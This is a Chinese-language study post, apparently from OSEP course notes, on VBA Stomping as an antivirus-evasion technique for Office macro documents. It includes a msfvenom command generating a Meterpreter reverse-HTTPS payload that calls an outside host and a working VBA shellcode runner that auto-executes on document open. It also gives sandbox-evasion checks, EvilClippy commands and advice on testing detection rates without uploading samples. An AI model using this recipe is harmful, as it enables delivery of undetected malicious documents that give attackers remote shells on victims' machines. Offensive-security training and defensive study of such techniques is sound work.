---
title: OSEP-07-VBA-Stomping详解
description: '07-杀软绕过 | 07-VBA-Stomping详解'
pubDate: 2026-01-30T00:01:06+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# VBA Stomping 技术详解

## 写在前面

VBA Stomping 是一种高级的杀软绕过技术，通过删除 VBA 源代码只保留 P-code 来绕过杀软检测。本章详细介绍 VBA Stomping 的原理和实现方法。

---

## 一、VBA 代码存储机制

### 1.1 Microsoft Office 文件格式

```
Microsoft Office 文件格式:

1. 旧格式 (.doc, .xls)
   └── Compound File Binary Format (CFBF)
       └── 类似于文件系统的结构
       └── 使用 FlexHEX 等工具查看

2. 新格式 (.docm, .xlsm)
   └── ZIP 压缩包
       └── 可以直接解压查看
       └── VBA 代码在 vbaProject.bin 中
```

### 1.2 VBA 代码的两种形式

```
VBA 代码存储:

1. VBA 源代码 (CompressedSourceCode)
   ├── 人类可读的 VBA 代码
   ├── 部分压缩存储
   └── 位于 NewMacros 文件末尾

2. P-code (PerformanceCache)
   ├── 预编译的 VBA 代码
   ├── 针对特定 Office 版本
   └── 位于 _VBA_PROJECT 和 NewMacros 中

执行逻辑:
┌─────────────────────────────────────────────────────────────┐
│  如果 Office 版本匹配 → 执行 P-code                         │
│  如果 Office 版本不匹配 → 执行 VBA 源代码                   │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 Office 版本标识

```
_VBA_PROJECT 文件中的版本信息:

00007fff`c75c24c0  4f666669 63652031 36000000  Office 16...
                   ^^^^^^^^
                   Office 2016

版本对应:
- Office 16 = Office 2016/2019/365
- Office 15 = Office 2013
- Office 14 = Office 2010
```

---

## 二、使用 FlexHEX 分析

### 2.1 打开 Word 文档

```
步骤:
1. 打开 FlexHEX
2. File > Open > OLE Compound File...
3. 选择 .doc 文件
4. 在 Navigation 窗口展开 Macros > VBA
```

### 2.2 关键文件结构

```
Macros/
├── VBA/
│   ├── _VBA_PROJECT      # P-code 和版本信息
│   ├── dir               # 目录信息
│   ├── NewMacros         # VBA 代码和 P-code
│   └── ThisDocument      # 文档级代码
└── PROJECT               # 项目信息
```

### 2.3 PROJECT 文件

```
PROJECT 文件内容:
Module=NewMacros    ← 这行链接 VBA 编辑器显示的宏

如果删除这行:
- VBA 编辑器中不显示宏
- 但宏仍然存在并可执行
```

### 2.4 NewMacros 文件结构

```
NewMacros 文件:

┌─────────────────────────────────────────────────────────────┐
│  P-code (PerformanceCache)                                  │
│  - 编译后的二进制代码                                        │
│  - 包含 API 名称等字符串                                     │
├─────────────────────────────────────────────────────────────┤
│  VBA 源代码 (CompressedSourceCode)                          │
│  - 以 "Attribute VB_Name" 开头                              │
│  - 部分压缩的源代码                                          │
└─────────────────────────────────────────────────────────────┘
```

---

## 三、VBA Stomping 实现

### 3.1 手动 Stomping 步骤

```
步骤 1: 定位 VBA 源代码
- 在 FlexHEX 中打开 NewMacros
- 搜索 "Attribute VB_Name"
- 这是 VBA 源代码的开始位置

步骤 2: 选择要删除的内容
- 从 "Attribute VB_Name" 开始
- 选择到文件末尾

步骤 3: 用零字节替换
- Edit > Insert Zero Block
- 确认替换大小
- 保存文件

步骤 4: 关闭 FlexHEX
- 文件会自动重新压缩
```

### 3.2 验证 Stomping 效果

```
验证步骤:

1. 打开 Word 文档
   - 应该看到 "Enable Content" 警告

2. 打开 VBA 编辑器 (Alt+F11)
   - NewMacros 应该是空的

3. 启用宏
   - 宏应该正常执行
   - VBA 源代码会被 P-code 反编译并重新显示
```

### 3.3 使用 EvilClippy 自动化

```bash
# EvilClippy 是自动化 VBA Stomping 的工具

# 基本用法
EvilClippy.exe -s fakecode.vba payload.doc

# 参数说明:
# -s: 指定假的 VBA 代码（用于替换源代码）
# payload.doc: 目标文档

# 示例 fakecode.vba:
Sub AutoOpen()
    MsgBox "Hello World"
End Sub
```

---

## 四、VBA Stomping 的限制

### 4.1 版本依赖

```
重要限制:

1. P-code 是版本特定的
   - 必须在目标相同版本的 Office 上创建
   - 32位和64位版本不兼容

2. 如果版本不匹配
   - P-code 被忽略
   - VBA 源代码被执行
   - 如果源代码被删除，宏将失败

3. 解决方案
   - 了解目标环境的 Office 版本
   - 在相同版本上创建文档
```

### 4.2 检测率对比

```
检测率对比 (AntiScan.Me):

原始 VBA Shellcode Runner:     7/26 检测
加密 VBA Shellcode Runner:     7/26 检测
VBA Stomping 后:               4/26 检测

结论: VBA Stomping 可以显著降低检测率
```

---

## 五、完整攻击流程

### 5.1 准备阶段

```powershell
# 1. 生成 Shellcode
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f vbapplication

# 2. 创建 VBA 宏
# 包含 Shellcode Runner 代码

# 3. 加密 Shellcode (可选)
# 使用 Caesar 密码或 XOR 加密
```

### 5.2 创建文档

```vba
' VBA Shellcode Runner 示例
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long)

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr

    ' 加密的 Shellcode
    ' 实际使用时替换为完整加密字节；不要把省略号放进 Array。
    buf = Array(234, 132, 2, 2, 2)

    ' 解密
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    ' 执行
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
```

### 5.3 执行 Stomping

```bash
# 使用 EvilClippy
EvilClippy.exe -s fakecode.vba payload.doc

# 或手动使用 FlexHEX
# 1. 打开文档
# 2. 定位 VBA 源代码
# 3. 用零字节替换
# 4. 保存
```

### 5.4 验证和测试

```
测试步骤:

1. 在目标版本的 Office 上测试
   - 确保宏正常执行
   - 确保获得反向 Shell

2. 扫描检测率
   - 使用 AntiScan.Me 或类似服务
   - 不要使用 VirusTotal（会上传样本）

3. 调整和优化
   - 如果检测率仍然高，考虑其他混淆技术
```

---

## 六、与其他技术结合

### 6.1 结合 Caesar 密码加密

```vba
' 加密 Shellcode
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2  ' Caesar 密码解密
Next i
```

### 6.2 结合时间延迟

```vba
' 时间延迟检测沙箱
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Dim t1 As Date
Dim t2 As Date

t1 = Now()
Sleep(2000)
t2 = Now()

If DateDiff("s", t1, t2) < 2 Then
    Exit Function  ' 可能在沙箱中
End If
```

### 6.3 结合文档名检查

```vba
' 检查文档名（沙箱通常会重命名文档）
If ActiveDocument.Name <> "report.doc" Then
    Exit Function
End If
```

---

## 七、练习题

### 选择题

1. VBA Stomping 删除的是什么？
   - A) P-code
   - B) VBA 源代码
   - C) 整个宏
   - D) 文档内容

2. P-code 的特点是什么？
   - A) 跨版本兼容
   - B) 版本特定
   - C) 不可执行
   - D) 纯文本格式

3. 如果 Office 版本不匹配会发生什么？
   - A) P-code 被执行
   - B) VBA 源代码被执行
   - C) 文档无法打开
   - D) 宏被禁用

4. EvilClippy 的作用是什么？
   - A) 加密 VBA 代码
   - B) 自动化 VBA Stomping
   - C) 生成 Shellcode
   - D) 混淆字符串

5. VBA 源代码以什么开头？
   - A) "Sub AutoOpen"
   - B) "Attribute VB_Name"
   - C) "Private Declare"
   - D) "Function"

### 答案

1-B, 2-B, 3-B, 4-B, 5-B

---

## 下一步

掌握了 VBA Stomping 技术后，继续学习 [08-WMI解链技术.md](/blog/osep/07-杀软绕过/08-wmi解链技术/)，了解如何使用 WMI 创建进程来避免父子进程关系检测。
